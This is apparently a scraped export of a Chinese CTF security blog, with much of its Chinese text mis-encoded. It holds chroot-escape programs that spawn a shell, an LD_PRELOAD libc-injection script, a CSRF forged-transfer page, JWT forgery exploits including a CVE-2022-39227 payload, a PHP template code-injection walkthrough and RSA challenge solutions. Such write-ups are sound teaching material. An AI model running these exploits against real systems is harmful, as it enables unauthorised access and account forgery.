http://www.bpfh.net/simes/computing/chroot-break.html#include &lt;stdio.h&gt; #include &lt;errno.h&gt; #include &lt;fcntl.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/stat.h&gt; #include &lt;sys/types.h&gt; int main() &#123; int x; /* Used to move up a directory tree */ int dir_fd; /* File descriptor to directory */ mkdir(&quot;chroot-breakout-dir&quot;, 0755); dir_fd=open(&quot;.&quot;, O_RDONLY); chroot(&quot;chroot-breakout-dir&quot;); fchdir(dir_fd); close(dir_fd); for(x = 0; x &lt; 1024; x++) &#123; chdir(&quot;..&quot;); &#125; chroot(&quot;.&quot;); system(&quot;/bin/sh&quot;);&#125; Perl 123456789101112131415161718192021222324252627282930313233#!/usr/bin/perl -wuse strict;# unchroot.pl Dec 2007# http://pentestmonkey.net/blog/chroot-breakout-perl# This script may be used for legal purposes only.# Go to the root of the jailchdir &quot;/&quot;;# Open filehandle to root of jailopendir JAILROOT, &quot;.&quot; or die &quot;ERROR: Couldn&#x27;t get file handle to root of jailn&quot;;# Create a subdir, move into itmkdir &quot;mysubdir&quot;;chdir &quot;mysubdir&quot;;# Lock ourselves in a new jailchroot &quot;.&quot;;# Use our filehandle to get back to the root of the old jailchdir(*JAILROOT);# Get to the real rootwhile ((stat(&quot;.&quot;))[0] != (stat(&quot;..&quot;))[0] or (stat(&quot;.&quot;))[1] != (stat(&quot;..&quot;))[1]) &#123; chdir &quot;..&quot;;&#125;# Lock ourselves in real root - so we&#x27;re not really in a jail at all nowchroot &quot;.&quot;;# Start an un-jailed shellsystem(&quot;/bin/sh&quot;); libcæ³¨å…¥echo -e å¯ä»¥å†™å…¥äºŒè¿›åˆ¶ç¨‹åºï¼Œåˆ©ç”¨ echo -e ä¸Šä¼ soæ–‡ä»¶ã€‚åˆ©ç”¨elfæ–‡ä»¶åŠ¨æ€åŠ è½½ç¯å¢ƒå˜é‡æ›´æ¢libcï¼Œå®ç°libcæ³¨å…¥ã€‚ 1234567891011121314151617import osfrom pwn import *#context.log_level=&#x27;debug&#x27;io = remote(&quot;xxx&quot;,xxx)b = open(&quot;./in.so&quot;).read().encode(&quot;hex&quot;)c = &quot;&quot;for i in range(0,len(b),2): c += &#x27;\\\\x&#x27;+b[i]+b[i+1]payload = &#x27;echo -e &quot;&#x27;+c+&#x27;&quot;&#x27;+&#x27;&gt; exp&#x27;print &quot;[+] length: &quot; + hex(len(payload))io.sendline(payload)io.sendline(&quot;LD_PRELOAD=$PWD/exp /bin/sh&quot;)io.interactive() 1234567891011// in.so#include &lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include &lt;sys/stat.h&gt;int getchar()&#123; chmod(&quot;flag&quot;,777); printf(&quot;%s\\n&quot;, &quot;6666666&quot;);&#125;#gcc -shared -fPIC in.c -o in.so#LD_PRELOAD=$PWD/in.so /bin/sh","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"é€ƒé€¸","slug":"é€ƒé€¸","permalink":"https://lazzzaro.github.io/tags/%E9%80%83%E9%80%B8/"},{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"node.js","slug":"node-js","permalink":"https://lazzzaro.github.io/tags/node-js/"}],"author":"Lazzaro"},{"title":"CSRF","slug":"web-CSRF","date":"2020-08-17T13:57:41.000Z","updated":"2020-10-25T15:38:41.201Z","comments":true,"path":"2020/08/17/web-CSRF/","permalink":"https://lazzzaro.github.io/2020/08/17/web-CSRF/","excerpt":"","text":"â€‹ è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰CSRFï¼Œå…¨å Cross Site Request Forgeryï¼Œè·¨ç«™è¯·æ±‚ä¼ªé€ ã€‚å¾ˆå®¹æ˜“å°†å®ƒä¸ XSS æ··æ·†ï¼Œå¯¹äº CSRFï¼Œå…¶ä¸¤ä¸ªå…³é”®ç‚¹æ˜¯è·¨ç«™ç‚¹çš„è¯·æ±‚ä¸è¯·æ±‚çš„ä¼ªé€ ï¼Œç”±äºç›®æ ‡ç«™æ—  token æˆ– referer é˜²å¾¡ï¼Œå¯¼è‡´ç”¨æˆ·çš„æ•æ„Ÿæ“ä½œçš„æ¯ä¸€ä¸ªå‚æ•°éƒ½å¯ä»¥è¢«æ”»å‡»è€…è·çŸ¥ï¼Œæ”»å‡»è€…å³å¯ä»¥ä¼ªé€ ä¸€ä¸ªå®Œå…¨ä¸€æ ·çš„è¯·æ±‚ä»¥ç”¨æˆ·çš„èº«ä»½è¾¾åˆ°æ¶æ„ç›®çš„ã€‚ æŒ‰è¯·æ±‚ç±»å‹ï¼Œå¯åˆ†ä¸º GET å‹å’Œ POST å‹ã€‚ æŒ‰æ”»å‡»æ–¹å¼ï¼Œå¯åˆ†ä¸º HTML CSRFã€JSON HiJackingã€Flash CSRF ç­‰ã€‚ HTML CSRFä½¿ç”¨è¡¨å•æ¥å¯¹ POST å‹çš„è¯·æ±‚è¿›è¡Œä¼ªé€ ï¼š 123456789101112131415161718192021222324252627282930313233343536373839&lt;!--click.html--&gt;&lt;html&gt;&lt;body&gt;&lt;h1&gt; This page forges an HTTP POST request.&lt;/h1&gt;&lt;script type=&quot;text/javascript&quot;&gt; function post(url, fields) &#123; //create a &lt;form&gt; element. var p = document.createElement(&quot;form&quot;); //construct the form p.action = url; p.innerHTML = fields; p.target = &quot;_self&quot;; p.method = &quot;post&quot;; //append the form to the current page. document.body.appendChild(p); //submit the form p.submit(); &#125; function csrf_hack() &#123; var fields; // The following are form entries that need to be filled out // by attackers. The entries are made hidden, so the victim // won&#x27;t be able to see them. fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;target&#x27; value=&#x27;aaaaaa&#x27;&gt;&quot;; fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;money&#x27; value=&#x27;10000&#x27;&gt;&quot;; fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;messages&#x27; value=&#x27;test&#x27;&gt;&quot;; post(&#x27;http://173.82.206.142:8005/transfer.php&#x27;, fields); &#125; // invoke csrf_hack() after the page is loaded. window.onload = function() &#123; csrf_hack(); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"CSRF","slug":"CSRF","permalink":"https://lazzzaro.github.io/tags/CSRF/"}],"author":"Lazzaro"},{"title":"JWT","slug":"web-JWT","date":"2020-08-11T11:38:44.000Z","updated":"2023-10-31T17:56:33.768Z","comments":true,"path":"2020/08/11/web-JWT/","permalink":"https://lazzzaro.github.io/2020/08/11/web-JWT/","excerpt":"","text":"â€‹ JWTçš„å…¨ç§°æ˜¯Json Web Tokenã€‚å®ƒéµå¾ªJSONæ ¼å¼ï¼Œå°†ç”¨æˆ·ä¿¡æ¯åŠ å¯†åˆ°tokené‡Œï¼ŒæœåŠ¡å™¨ä¸ä¿å­˜ä»»ä½•ç”¨æˆ·ä¿¡æ¯ï¼Œåªä¿å­˜å¯†é’¥ä¿¡æ¯ï¼Œé€šè¿‡ä½¿ç”¨ç‰¹å®šåŠ å¯†ç®—æ³•éªŒè¯tokenï¼Œé€šè¿‡tokenéªŒè¯ç”¨æˆ·èº«ä»½ã€‚åŸºäºtokençš„èº«ä»½éªŒè¯å¯ä»¥æ›¿ä»£ä¼ ç»Ÿçš„cookie+sessionèº«ä»½éªŒè¯æ–¹æ³•ã€‚ JWTç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼šheader.payload.signature headeréƒ¨åˆ†æœ€å¸¸ç”¨çš„ä¸¤ä¸ªå­—æ®µæ˜¯algå’Œtypï¼ŒalgæŒ‡å®šäº†tokenåŠ å¯†ä½¿ç”¨çš„ç®—æ³•ï¼ˆæœ€å¸¸ç”¨çš„ä¸ºHMACå’ŒRSAç®—æ³•ï¼‰ï¼Œtypå£°æ˜ç±»å‹ä¸ºJWTã€‚ payloadåˆ™ä¸ºç”¨æˆ·æ•°æ®ä»¥åŠä¸€äº›å…ƒæ•°æ®æœ‰å…³çš„å£°æ˜ï¼Œç”¨ä»¥å£°æ˜æƒé™ã€‚ signatureçš„åŠŸèƒ½æ˜¯ä¿æŠ¤tokenå®Œæ•´æ€§ã€‚ ç”Ÿæˆæ–¹æ³•ä¸ºå°†headerå’Œpayloadä¸¤ä¸ªéƒ¨åˆ†è”ç»“èµ·æ¥ï¼Œç„¶åé€šè¿‡headeréƒ¨åˆ†æŒ‡å®šçš„ç®—æ³•ï¼Œè®¡ç®—å‡ºç­¾åã€‚ æŠ½è±¡æˆå…¬å¼å°±æ˜¯ signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key) å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç¼–ç headerå’Œpayloadæ—¶ä½¿ç”¨çš„ç¼–ç æ–¹å¼ä¸ºbase64urlencodeï¼Œbase64urlç¼–ç æ˜¯base64çš„ä¿®æ”¹ç‰ˆï¼Œä¸ºäº†æ–¹ä¾¿åœ¨ç½‘ç»œä¸­ä¼ è¾“ä½¿ç”¨äº†ä¸åŒçš„ç¼–ç è¡¨ï¼Œå®ƒä¸ä¼šåœ¨æœ«å°¾å¡«å……â€=â€å·ï¼Œå¹¶å°†æ ‡å‡†Base64ä¸­çš„â€+â€å’Œâ€/â€œåˆ†åˆ«æ”¹æˆäº†â€-â€œå’Œâ€-â€œã€‚ å®Œæ•´tokenç”Ÿæˆåœ¨çº¿https://jwt.io/ Pythonpythonçš„Pyjwtä½¿ç”¨ç¤ºä¾‹ï¼š 12345import jwtencoded_jwt = jwt.encode(&#123;&#x27;user_name&#x27;: &#x27;admin&#x27;&#125;, &#x27;key&#x27;, algorithm=&#x27;HS256&#x27;)print(encoded_jwt)print(jwt.decode(encoded_jwt, &#x27;key&#x27;, algorithms=[&#x27;HS256&#x27;])) â€‹ æ”»å‡»æ–¹å¼ç©ºåŠ å¯†ç®—æ³•JWTæ”¯æŒä½¿ç”¨ç©ºåŠ å¯†ç®—æ³•ï¼Œå¯ä»¥åœ¨headerä¸­æŒ‡å®šalgä¸ºNone è¿™æ ·çš„è¯ï¼Œåªè¦æŠŠsignatureè®¾ç½®ä¸ºç©ºï¼ˆå³ä¸æ·»åŠ signatureå­—æ®µï¼‰ï¼Œæäº¤åˆ°æœåŠ¡å™¨ï¼Œä»»ä½•tokenéƒ½å¯ä»¥é€šè¿‡æœåŠ¡å™¨çš„éªŒè¯ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä½¿ç”¨ä»¥ä¸‹çš„å­—æ®µ 12345678&#123; &quot;alg&quot; : &quot;None&quot;, &quot;typ&quot; : &quot;jwt&quot;&#125;&#123; &quot;user&quot; : &quot;Admin&quot;&#125; ç”Ÿæˆçš„å®Œæ•´tokenä¸ºew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0 (header+â€™.â€™+payloadï¼Œå»æ‰äº†â€™.â€™+signatureå­—æ®µ) ç©ºåŠ å¯†ç®—æ³•çš„è®¾è®¡åˆè¡·æ˜¯ç”¨äºè°ƒè¯•çš„ï¼Œä½†æ˜¯å¦‚æœæŸå¤©å¼€å‘äººå‘˜è„‘é˜”ç“¦ç‰¹äº†ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¼€å¯äº†ç©ºåŠ å¯†ç®—æ³•ï¼Œç¼ºå°‘ç­¾åç®—æ³•ï¼Œjwtä¿è¯ä¿¡æ¯ä¸è¢«ç¯¡æ”¹çš„åŠŸèƒ½å°±å¤±æ•ˆäº†ã€‚æ”»å‡»è€…åªéœ€è¦æŠŠalgå­—æ®µè®¾ç½®ä¸ºNoneï¼Œå°±å¯ä»¥åœ¨payloadä¸­æ„é€ èº«ä»½ä¿¡æ¯ï¼Œä¼ªé€ ç”¨æˆ·èº«ä»½ã€‚ â€‹ ä¿®æ”¹RSAåŠ å¯†ç®—æ³•ä¸ºHMACJWTä¸­æœ€å¸¸ç”¨çš„ä¸¤ç§ç®—æ³•ä¸ºHMACå’ŒRSAã€‚ HMACæ˜¯å¯†é’¥ç›¸å…³çš„å“ˆå¸Œè¿ç®—æ¶ˆæ¯è®¤è¯ç ï¼ˆHash-based Message Authentication Codeï¼‰çš„ç¼©å†™ï¼Œå®ƒæ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨ç›¸åŒçš„å¯†é’¥å¯¹ä¼ è¾“ä¿¡æ¯è¿›è¡ŒåŠ è§£å¯†ã€‚ RSAåˆ™æ˜¯ä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨ç§é’¥åŠ å¯†æ˜æ–‡ï¼Œå…¬é’¥è§£å¯†å¯†æ–‡ã€‚ åœ¨HMACå’ŒRSAç®—æ³•ä¸­ï¼Œéƒ½æ˜¯ä½¿ç”¨ç§é’¥å¯¹signatureå­—æ®µè¿›è¡Œç­¾åï¼Œåªæœ‰æ‹¿åˆ°äº†åŠ å¯†æ—¶ä½¿ç”¨çš„ç§é’¥ï¼Œæ‰æœ‰å¯èƒ½ä¼ªé€ tokenã€‚ ç°åœ¨æˆ‘ä»¬å‡è®¾æœ‰è¿™æ ·ä¸€ç§æƒ…å†µï¼Œä¸€ä¸ªWebåº”ç”¨ï¼Œåœ¨JWTä¼ è¾“è¿‡ç¨‹ä¸­ä½¿ç”¨RSAç®—æ³•ï¼Œå¯†é’¥pemå¯¹JWT tokenè¿›è¡Œç­¾åï¼Œå…¬é’¥pubå¯¹ç­¾åè¿›è¡ŒéªŒè¯ã€‚ 1234&#123; &quot;alg&quot; : &quot;RS256&quot;, &quot;typ&quot; : &quot;jwt&quot;&#125; é€šå¸¸æƒ…å†µä¸‹å¯†é’¥pemæ˜¯æ— æ³•è·å–åˆ°çš„ï¼Œä½†æ˜¯å…¬é’¥pubå´å¯ä»¥å¾ˆå®¹æ˜“é€šè¿‡æŸäº›é€”å¾„è¯»å–åˆ°ï¼Œè¿™æ—¶ï¼Œå°†JWTçš„åŠ å¯†ç®—æ³•ä¿®æ”¹ä¸ºHMACï¼Œå³ 1234&#123; &quot;alg&quot; : &quot;HS256&quot;, &quot;typ&quot; : &quot;jwt&quot;&#125; åŒæ—¶ä½¿ç”¨è·å–åˆ°çš„å…¬é’¥pubä½œä¸ºç®—æ³•çš„å¯†é’¥ï¼Œå¯¹tokenè¿›è¡Œç­¾åï¼Œå‘é€åˆ°æœåŠ¡å™¨ç«¯ã€‚ æœåŠ¡å™¨ç«¯ä¼šå°†RSAçš„å…¬é’¥ï¼ˆpubï¼‰è§†ä¸ºå½“å‰ç®—æ³•ï¼ˆHMACï¼‰çš„å¯†é’¥ï¼Œä½¿ç”¨HS256ç®—æ³•å¯¹æ¥æ”¶åˆ°çš„ç­¾åè¿›è¡ŒéªŒè¯ã€‚ 12345#python2import jwtpublic = open(&#x27;public.key&#x27;, &#x27;r&#x27;).read()payload=&#123;&quot;user&quot;:&quot;admin&quot;&#125;print(jwt.encode(payload, key=public, algorithm=&#x27;HS256&#x27;)) 123456import jwtheader = &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;payload = &#123;&quot;username&quot;:&quot;admin&quot;,&quot;grade&quot;:&quot;admin&quot;&#125;secret = open(&#x27;public.pem&#x27;,&#x27;r&#x27;).read()jwt_ = jwt.encode(headers=header,payload=payload,key=secret,algorithm=&#x27;HS256&#x27;)print(jwt_) â€‹ çˆ†ç ´å¯†é’¥å¯¹ JWT çš„å¯†é’¥çˆ†ç ´éœ€è¦åœ¨ä¸€å®šçš„å‰æä¸‹è¿›è¡Œï¼š çŸ¥æ‚‰JWTä½¿ç”¨çš„åŠ å¯†ç®—æ³• ä¸€æ®µæœ‰æ•ˆçš„ã€å·²ç­¾åçš„token ç­¾åç”¨çš„å¯†é’¥ä¸å¤æ‚ï¼ˆå¼±å¯†é’¥ï¼‰ æ‰€ä»¥å…¶å®JWT å¯†é’¥çˆ†ç ´çš„å±€é™æ€§å¾ˆå¤§ã€‚ ç›¸å…³å·¥å…·ï¼š gojwtcrack ./gojwtcrack -t token.txt -d rockyou.txt c-jwt-cracker ./jwtcrack [JWT] jwt_tool python3 jwt_tool.py [JWT] CrackJWTKey python3 CrackJWT.py jwt_str keys.txt â€‹ å…¶ä»–pyjwtåŒ…-jwtä¼ªé€  (CVE-2022-39227)å½±å“ç‰ˆæœ¬ï¼špyjwt&lt;3.3.4 ä»£ç ï¼š 12345678910111213141516171819202122232425262728import base64import stringimport randomfrom flask import *import jwcrypto.jwk as jwkimport picklefrom python_jwt import *app = Flask(__name__)def generate_random_string(length=16): characters = string.ascii_letters + string.digits # åŒ…å«å­—æ¯å’Œæ•°å­— random_string = &#x27;&#x27;.join(random.choice(characters) for _ in range(length)) return random_stringapp.config[&#x27;SECRET_KEY&#x27;] = generate_random_string(16)key = jwk.JWK.generate(kty=&#x27;RSA&#x27;, size=2048)@app.route(&quot;/&quot;)def index(): payload=request.args.get(&quot;token&quot;) if payload: token=verify_jwt(payload, key, [&#x27;PS256&#x27;]) session[&quot;role&quot;]=token[1][&#x27;role&#x27;] return render_template(&#x27;index.html&#x27;) else: session[&quot;role&quot;]=&quot;guest&quot; user=&#123;&quot;username&quot;:&quot;xxx&quot;,&quot;role&quot;:&quot;guest&quot;&#125; jwt = generate_jwt(user, key, &#x27;PS256&#x27;, timedelta(minutes=60)) return render_template(&#x27;index.html&#x27;,token=jwt) EXP: 1234567891011121314# å®˜æ–¹ï¼šhttps://github.com/davedoesdev/python-jwt/blob/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9/test/vulnerability_vows.pyfrom json import loads, dumpsimport python_jwt as jwtfrom jwcrypto.common import base64url_decode, base64url_encodejwt = &quot;xxx&quot; # JWT String[header, payload, signature] = topic.split(&#x27;.&#x27;)parsed_payload = loads(base64url_decode(payload))parsed_payload[&#x27;is_admin&#x27;] = 1parsed_payload[&#x27;username&#x27;] = &#x27;admin&#x27;parsed_payload[&#x27;exp&#x27;] = 2000000000fake_payload = base64url_encode((dumps(parsed_payload, separators=(&#x27;,&#x27;, &#x27;:&#x27;))))print(&#x27;&#123;&quot; &#x27; + header + &#x27;.&#x27; + fake_payload + &#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27; + header + &#x27;&quot;, &quot;payload&quot;:&quot;&#x27; + payload + &#x27;&quot;,&quot;signature&quot;:&quot;&#x27; + signature + &#x27;&quot;&#125;&#x27;) å‚è€ƒï¼š CVE-2022-39227æ¼æ´åˆ†æ 2022ç¥¥äº‘æ¯ - FunWEB NewstarCTF 2023 - Yeâ€™s Pickle","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"JWT","slug":"JWT","permalink":"https://lazzzaro.github.io/tags/JWT/"}],"author":"Lazzaro"},{"title":"CBCTF ç¬¬ä¸‰å±Šèµ›åšæ¯","slug":"match-CBCTF-ç¬¬ä¸‰å±Šèµ›åšæ¯","date":"2020-07-28T12:31:07.000Z","updated":"2020-07-28T14:04:37.567Z","comments":true,"path":"2020/07/28/match-CBCTF-ç¬¬ä¸‰å±Šèµ›åšæ¯/","permalink":"https://lazzzaro.github.io/2020/07/28/match-CBCTF-%E7%AC%AC%E4%B8%89%E5%B1%8A%E8%B5%9B%E5%8D%9A%E6%9D%AF/","excerpt":"","text":"â€‹ ä»ç¾¤å‹@Neve3noå¤„å¾—çŸ¥å¹¶æ‰“æ‰“é…±æ²¹çš„å°èµ›~~ â€‹ Miscsign_in 66 6c 61 67 7b 39 35 63 35 62 66 33 32 32 39 32 64 37 35 66 35 37 61 35 30 36 37 36 66 36 61 62 35 64 64 38 33 7d ç›´æ¥hexè½¬stringå¾—flagã€‚ â€‹ Î±å±‚ è¿™æ³¢å•Šï¼Œè¿™æ³¢åœ¨é˜¿å°”æ³•å±‚ ç”¨stegsolveå·¥å…·å°†ä¸¤å¼ å›¾ç‰‡xoræ“ä½œï¼Œåœˆä¸­æ­£ç¡®flagã€‚ â€‹ guess æœ‰äº›äº‹ï¼Œçœ‹å¾—å¾ˆæ¸…ï¼Œå´è¯´ä¸æ¸…ï¼›æœ‰äº›äººï¼Œäº†è§£å¾ˆæ·±ï¼Œå´çŒœä¸é€ï¼›æœ‰äº›ç†ï¼Œå¾ˆæƒ³ä¸é€šï¼Œå´è¡Œçš„é€šã€‚ åœ°å€ï¼š47.52.113.129 12345 çŒœæ•°å­—ï¼Œè¯¯å·®å€¼å°åˆ°0.001çš„å€¼ç®—æˆåŠŸã€‚å…ˆè¾“å…¥ç»™çš„å€¼ï¼Œç„¶ååˆ°è½®è‡ªå·±ç»™æ•°ï¼Œè¾“å…¥èŒƒå›´0.00-10000.00å†…ä»»ä½•ä¸€ä¸ªæ•°ï¼Œè„šæœ¬äºŒåˆ†æ³•çŒœæµ‹æœ€åæƒ…å†µéƒ½èƒ½åœ¨ $\\log_2{10000*100} \\approx 19.9$ æ¬¡çŒœå‡ºã€‚ è€ƒè™‘ç‰¹æ®Šæ•°å€¼NaNï¼Œç”¨æ¥è¡¨ç¤ºä¸€ä¸ªæœ¬æ¥è¦è¿”å›æ•°å€¼çš„æ“ä½œæ•°æœªè¿”å›æ•°å€¼çš„æƒ…å†µã€‚ä»»ä½•æ¶‰åŠNaNçš„æ“ä½œéƒ½ä¼šè¿”å›NaNï¼Œå…¶æ¬¡ï¼Œå®ƒä¸ä»»ä½•å€¼éƒ½ä¸ç­‰ï¼ŒåŒ…æ‹¬è‡ªèº«ã€‚ è¾“å…¥nanï¼Œè„šæœ¬çŒœæµ‹æ¬¡æ•°è¶…è¿‡20ï¼Œæ‹¿åˆ°flagã€‚ â€‹ Webå°–å°–çš„å•†åº— å°–å°–å¼€äº†ä¸€ä¸ªå•†åº—,å¿«çœ‹èƒ½ä¸èƒ½ä¹°åˆ°flagå§ http://checkin.race2020.0rays.club/ ä¸€ä¸ªè´­ä¹°é¡µé¢ï¼Œä½™é¢1000ä¸è¶³ä»¥è´­ä¹°99999ä»·å€¼çš„flagã€‚æŠ“åŒ…å‘ç°ä½™é¢å€¼å­˜å‚¨äºcookieé‡Œçš„moneyä¸­ï¼Œç›´æ¥ä¿®æ”¹æäº¤è¯·æ±‚ï¼Œæ‹¿åˆ°flagã€‚ â€‹ Hacked_By_V Vä»Šå¤©çœ‹åˆ°äº†ä¸€ä¸ªå¼±å£ä»¤çš„ç«™ï¼Œåæ‰‹å°±æŠŠä»–æ—¥äº†ã€‚å¬è¯´åå°å¯†ç æ˜¯admin/123456 http://47.52.113.129:10002/ é“¾æ¥ï¼šhttps://pan.baidu.com/s/1FL7scmbbEvIP3wskLVGVOw æå–ç ï¼š1234 æ˜“å±…CMSï¼ˆEjuCMSï¼‰ï¼Œä¸‹è½½æºç ï¼Œç‰ˆæœ¬2.xï¼Œç»™äº†åå°è´¦å¯†ã€‚é¦–å…ˆæœç´¢ç°æˆæ¼æ´ï¼Œå­˜åœ¨åå°æ¨¡æ¿ä»£ç æ‰§è¡Œæ¼æ´ã€‚ æ‰¾åˆ°åå°/login.php?s=Admin/loginè¿›å…¥ï¼ŒåŠŸèƒ½æ¨¡å—-æ¨¡æ¿ç®¡ç†-defaultç®¡ç†ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚ pcä¸‹çš„list_search.htmï¼Œæ˜¾ç„¶èƒ½çŸ¥é“æ­¤ä¸ºæœç´¢ç»“æœé¡µæ¨¡æ¿ï¼Œæ‰§è¡Œä»£ç éƒ¨åˆ†éƒ½ä½äºèŠ±æ‹¬å·&#123;&#125;ä¸­ï¼Œå°è¯•æ’å…¥&#123;php&#125;phpinfo();&#123;/php&#125;ä¿å­˜ï¼Œå‰ç«¯å‘ç°èƒ½æˆåŠŸæ‰§è¡Œã€‚ï¼ˆå¯åœ¨ç›®å½•ä¸‹æ ¹æ®æ—¶é—´æŸ¥çœ‹ä»–äººä¿®æ”¹ç—•è¿¹2333~ï¼‰ ä¸€å¼€å§‹å°†ä»£ç ä¿®æ”¹ä¸º&#123;php&#125;echo system(&#39;ls&#39;);&#123;/php&#125;å‘ç°æ‰§è¡Œä¸æˆåŠŸï¼Œå›åˆ°phpinfoç»“æœé¡µæŸ¥çœ‹disable_functionsï¼Œçœ‹åˆ°passthru/exec/system/putenv/shell_execå…¨ä¸èƒ½ä½¿ç”¨ã€‚ æ¢è¯»å–å‡½æ•°ä¸Šï¼Œä¿®æ”¹ä»£ç ä¸º&#123;php&#125;print_r(scand_dir(&#39;.&#39;));&#123;/php&#125;è¯»åˆ°ç›®å½•ä¸‹flagæ–‡ä»¶flag_BzH652ï¼Œå†ç”¨&#123;php&#125;print_r(file_get_contents(&#39;flag_BzH652&#39;));&#123;/php&#125;è¯»å‡ºflagã€‚ â€‹ Cryptocheck_in å…³äºè¿™é“é¢˜ï¼Œæˆ‘å¬è¿‡ä¸€ä¸ªåŠå…¶è¯¡å¼‚ç–¯ç‹‚çš„è°£è¨€ï¼Œåœ¨é‚£æ¼«é•¿åˆ°æ— æ³•è®¡ç®—çš„å²æœˆä¹‹å‰ï¼Œè¿™é“é¢˜å°±å·²ç»å­˜åœ¨äº†ã€‚ 123456789101112131415161718192021222324252627282930313233from gmpy2 import *from sympy import isprime,nextprimefrom Crypto.Util.number import getPrime as getprime ,long_to_bytes,bytes_to_long,inversefrom vanish import flagimport randomdef Getprime(g): while True: p=g*random.randint(1,g)+1 if isprime(p): return pm=bytes_to_long(flag)g=getprime(512)p=Getprime(g)q=Getprime(g)e=65537def lcm(a,b): return (a*b)/gcd(a,b)print &#x27;lcm(p-1,q-1): %d&#x27;%(lcm(p-1,q-1))print &#x27;n: %d&#x27;%(p*q)print &#x27;c: %d&#x27;%(pow(m,e,p*q))&#x27;&#x27;&#x27;lcm(p-1,q-1): 29222879530390785742605477742453420902991175027283185502224574005903986263169096240656898659768251131170153243355896585116206546809026765977240398343841844413932022486239027317290376878970267549705130293352356070399197681533774641809920245792277386418338948725614463605422608450981946445029718369662946357705499281823362508397007696635982211082237545037851621498721235291885337720080893169582699780294708804334786758878624750037193583886404728146815380945201540n: 2228582814888322539771891137733971181257097900700884269780928959802985615275288341111620316685788511492461651695428697100554113037555468881895905318207963274537589532345166133820089694201148988443496514751074857966136041157336680322417272183777409351597268908625677512781049274972325769500959755298004643407023188886359792411648183582888979219785653927285023667015990929441992061367448365123092899330885934801013411132173550954938961520075931155848843991824723727187297663420031211934554344568933171179175237722716971390081142435747796272698118097337803559316319210494963021258386613285360239662354953552369582646607c: 2201106853018581355094419701171997731036843750081916703504266002782698731288317690546242336345890702261049147276084047271293227314969153138029180802403349980519050857699472720333400348342466190619778247784674359271736569275019018808569614566880813745619585529292155639979431043005511905548345767685472340763230813956617014122768477272236518467064016133244646900977041959848793579834848773548018337874928875046550721154575652528641850315494384644468806058021812603748441246192757443085386516155814337307681275922473564325028703523754319072117202083218199961250157611091952832038366393322275194833927035639232266868638&#x27;&#x27;&#x27; ç”±äº $lcm(p-1,q-1) =k(p-1)(q-1)&lt;&lt; n=pq$ï¼Œæ±‚ $d$ æ—¶ç”¨çš„æ¨¡å¦‚ä¸ºå¸¸è§„çš„ $\\varphi(n)=(p-1)(q-1)$ åˆ™ $k$ çš„çˆ†ç ´ç©ºé—´å°†å¾ˆå¤§ï¼Œæ‰€ä»¥ç”¨çš„æ¨¡åº”æ˜¯ $\\lambda(n)=lcm(p-1,q-1)$ã€‚å†æŒ‰å¸¸è§„è§£ $m$ ã€‚ 12345678910lcm=29222879530390785742605477742453420902991175027283185502224574005903986263169096240656898659768251131170153243355896585116206546809026765977240398343841844413932022486239027317290376878970267549705130293352356070399197681533774641809920245792277386418338948725614463605422608450981946445029718369662946357705499281823362508397007696635982211082237545037851621498721235291885337720080893169582699780294708804334786758878624750037193583886404728146815380945201540n=2228582814888322539771891137733971181257097900700884269780928959802985615275288341111620316685788511492461651695428697100554113037555468881895905318207963274537589532345166133820089694201148988443496514751074857966136041157336680322417272183777409351597268908625677512781049274972325769500959755298004643407023188886359792411648183582888979219785653927285023667015990929441992061367448365123092899330885934801013411132173550954938961520075931155848843991824723727187297663420031211934554344568933171179175237722716971390081142435747796272698118097337803559316319210494963021258386613285360239662354953552369582646607c=2201106853018581355094419701171997731036843750081916703504266002782698731288317690546242336345890702261049147276084047271293227314969153138029180802403349980519050857699472720333400348342466190619778247784674359271736569275019018808569614566880813745619585529292155639979431043005511905548345767685472340763230813956617014122768477272236518467064016133244646900977041959848793579834848773548018337874928875046550721154575652528641850315494384644468806058021812603748441246192757443085386516155814337307681275922473564325028703523754319072117202083218199961250157611091952832038366393322275194833927035639232266868638e = 65537import gmpy2d=gmpy2.invert(e,lcm)m=pow(c,d,n)print(bytes.fromhex(hex(m)[2:])) â€‹ warm_up ä»£ç ç²—ç³™çš„è´¨æ„Ÿåˆºç—›äº†æˆ‘çš„çœ¼ç›ï¼Œæˆ‘ä¼¼ä¹èƒ½é€šè¿‡è¿™æ–‡ä»¶é”‹åˆ©çš„è¾¹ç¼˜çª¥æ¢åˆ°â€œå®ƒâ€çš„æœ¬è´¨ï¼Œä½†æ˜¯æˆ‘ä¸èƒ½è¿™æ ·åšï¼Œæˆ‘å®³æ€•æˆ‘ä¼šçœ‹åˆ°è¿™é“é¢˜èƒŒåå‘åŠ£æ­¹æ¯’å¦‚åŒå¹½çµä¸€èˆ¬çš„éšå–»ã€‚ Hint: æ˜¯ä¸€ä¸ªç”±RSAè¡ç”Ÿå‡ºæ¥çš„å¯†ç 